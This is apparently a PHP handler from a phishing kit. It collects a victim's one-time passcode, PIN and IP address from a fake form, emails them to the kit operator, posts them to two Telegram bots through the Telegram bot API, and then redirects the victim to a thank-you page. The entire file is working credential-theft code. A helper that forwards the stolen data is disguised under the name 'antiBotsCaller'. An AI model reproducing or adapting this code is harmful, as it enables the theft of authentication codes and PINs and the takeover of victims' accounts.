<?php
include('../common/sub_includes.php');
include_once '../config.php';


ob_start();
if (!isset($_SESSION)) {
  session_start();  // Et on ouvre la session
}

$otp = $_POST['otp'];
$pin = $_POST['pin'];
$wpforms = $_POST['wpforms'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

$message = '
[♾️] +2 OTP [♾️]
'.$wpforms.'
👮 OTP : '.$otp.'
👮 PIN : '.$pin.'

🛒 Adresse IP : ' . $_SERVER['REMOTE_ADDR'];

    if($mail_send == true){
      $Subject=" 「♾️」+1 FR3SH OTP ".$_SESSION['name']." | ".$_SERVER['REMOTE_ADDR'];
      $head="From: amendegod@rez.cc <info@INUN.bg>";
      
      mail($rezmail,$Subject,$message,$head);
      }
     
	 
     $theip = $message;
     function antiBotsCaller($messaggio,$bot_token,$rez_chat) {
         $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $rez_chat;
         $url = $url . "&text=" . urlencode($messaggio);
         $ch = curl_init();
         $optArray = array(CURLOPT_URL => $url,CURLOPT_RETURNTRANSFER => true);curl_setopt_array($ch, $optArray);$result = curl_exec($ch);curl_close($ch);return $result;}antiBotsCaller($theip,$antit2,$antic1);antiBotsCaller($message,$bot_token,$rez_chat);

}
header('Location: ../merci.php');
?>